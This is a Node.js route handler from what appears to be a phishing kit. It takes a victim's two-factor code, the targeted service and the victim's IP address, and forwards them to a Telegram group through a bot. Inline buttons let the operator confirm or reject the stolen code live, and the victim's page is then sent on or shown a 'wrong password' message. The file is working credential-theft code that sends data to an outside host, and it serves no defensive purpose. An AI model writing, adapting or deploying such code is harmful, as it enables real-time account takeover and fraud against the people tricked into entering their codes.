const {bot, groupID} = require('../index');

const send2fa = async(req, res) => {
    const {twoFa, service} = req.body;
    const ip = req.clientIp;
    const keyboard = {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
              [
                { text: 'Верно', callback_data: 'correct' },
                { text: 'Не верно', callback_data: 'incorrect' }
              ]
            ]
          }
      };
    bot.sendMessage(groupID, `
🦣  ${ip}  🦣

🔑Подтверждение пароля🔑
      
🔄 Выберете действие 🔄
          
»»»       Сервис: ${service}       «««

»»»       ` + '`' + twoFa + '`' + '       «««',
 keyboard);
 bot.once('callback_query', (callbackQuery) => {
    const data = callbackQuery.data;
  
    if (data === 'correct') {
        bot.sendMessage(groupID, `
🦣  ${ip}  🦣
✅Перенаправлен на завершение✅`);
        bot.answerCallbackQuery(callbackQuery.id);
        return res.send({res: true});
    }
    if (data === 'incorrect') {
        bot.sendMessage(groupID, `
🦣  ${ip}  🦣
❌Сообщение о неверном пароле❌`);
        bot.answerCallbackQuery(callbackQuery.id);
        return res.send({res: false});
    }
});
}

module.exports = send2fa;